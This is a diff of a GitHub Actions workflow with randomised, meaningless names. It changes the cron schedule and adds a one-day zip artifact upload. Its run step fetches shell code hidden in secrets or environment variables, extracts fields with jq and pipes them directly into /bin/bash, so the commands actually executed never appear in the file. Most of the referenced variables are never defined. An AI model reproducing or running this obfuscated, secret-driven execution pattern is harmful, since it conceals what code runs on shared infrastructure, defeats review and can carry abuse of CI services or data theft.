@@ -1,32 +1,27 @@
 name: shizhongxili
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '27 1/6 * * *'
 
-jobs:  # 31006
+  schedule:
+    - cron: '57 0,6,12,18 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: shizhongxili
         env:
-          o36: ${{ secrets.o36 }}
+          uywz08029: ${{ secrets.uywz08029 }}
         run: |
-          echo $o36 | jq -r .ncz23 | /bin/bash
-          echo $o05 | jq -r .q55 | /bin/bash
-          echo $hf24 | jq -r .lel28031 | /bin/bash
-          echo $gv39 | jq -r .zdks50 | /bin/bash
-          echo $mtsri1536 | jq -r .f7461 | /bin/bash
-          echo $jrfs9405 | jq -r .esl67 | /bin/bash
-          echo $f196 | jq -r .hyux79 | /bin/bash
-          echo $ckx4478 | jq -r .hpr92931 | /bin/bash
-          echo $e65536 | jq -r .fkn118 | /bin/bash
-          echo $md12 | jq -r .w08234 | /bin/bash
-          echo $fm298 | jq -r .fghnd510 | /bin/bash
-          echo $amnqb958 | jq -r .t225 | /bin/bash
-          echo $p39001 | jq -r .rjy40 | /bin/bash
-          echo $fiiq00 | jq -r .zjf0 | /bin/bash
-          echo $exg85230 | jq -r .gfngy97 | /bin/bash
-          echo $bg4 | jq -r .quhpl4563 | /bin/bash
+          printf '%s' "$uywz08029" | jq -r .absjy91 | /bin/bash
+          printf '%s' "$ujtxe48" | jq -r .kefv95761 | /bin/bash
+          echo $ccjg29 | jq -r .m3763 | /bin/bash
+          printf '%s' "$dlm631" | jq -r .zwi619 | /bin/bash
+          printf '%s' "$a0486" | jq -r .zg42 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: SsDceyYR
+          path: "*.zip"
+          retention-days: 1
